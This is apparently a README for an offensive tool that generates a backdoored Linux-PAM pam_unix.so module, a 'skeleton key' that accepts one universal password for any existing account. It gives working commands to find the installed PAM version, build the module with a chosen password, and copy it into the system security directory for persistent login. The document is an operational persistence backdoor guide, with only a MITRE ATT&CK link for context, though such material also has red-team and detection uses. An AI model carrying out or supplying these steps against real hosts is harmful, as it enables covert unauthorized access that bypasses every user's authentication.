# Linux Skeleton Key              
This script automates the creation of a backdoor for Linux-PAM (Pluggable Authentication Modules). This is also known as a skeleton key.

## Usage
To generate the backdoored pam_unix.so run the following (Debian Based) command to determine the existing version of pam_unix.so on the host:
```sh
dpkg -l | grep libpam0g
```
Once you have the version run the following command with the `-v` as the version you found using the previous command and `-p` as the skeleton key/universal password.
```sh
./backdoor.sh -v 1.3.0 -p som3_s3cr4t_p455w0rd
```
You have to identify the PAM version installed on the system, to make sure the script will compile the right version. Otherwise you can break the whole system authentication.

After the execution of the script, the last step is to copy the generated pam_unix.so to the pam modules dir on the host. 
```sh
cp ./pam_unix.so /lib/x86_64-linux-gnu/security
```
After that, you can login to the system using an existing user, and the previously configured password.

## Resources
- https://attack.mitre.org/software/S0007/
